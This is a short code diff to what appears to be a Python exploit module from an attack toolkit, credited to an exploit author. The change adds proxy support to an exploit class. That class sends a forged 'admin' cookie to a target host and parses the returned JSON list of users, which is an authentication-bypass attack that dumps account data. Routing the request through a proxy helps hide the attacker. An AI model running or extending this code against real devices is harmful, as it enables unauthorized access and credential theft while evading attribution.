@@ -54,8 +54,12 @@ details = '''
  # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
  # version: 1.2
 '''
+proxy=None
+def set_agent(p):#设置代理
+    global proxy
+    proxy=p
 class exp:
-    def __init__(self,HST:str,port):
+    def __init__(self,HST:str,port,agent=None):
         if not port:        #若未指定端口则自动扫描
             from ..sniff import ScanPort_ as s
             ports_=[]
@@ -73,7 +77,7 @@ class exp:
         print(Colors.GREEN+banner+Colors.DEFAULT)
         print(Colors.ORANGE+"now is try:"+self.host+Colors.BR_COLOUR)
         try:
-            rX = requests.get(self.fullHost_1,headers=self.makeReqHeaders(xCookie="admin"),timeout=10.000)
+            rX = requests.get(self.fullHost_1,headers=self.makeReqHeaders(xCookie="admin"),proxies=proxy,timeout=10.000)
             try:
                 dataJson = json.loads(rX.text)
                 totUsr = len(dataJson["list"])
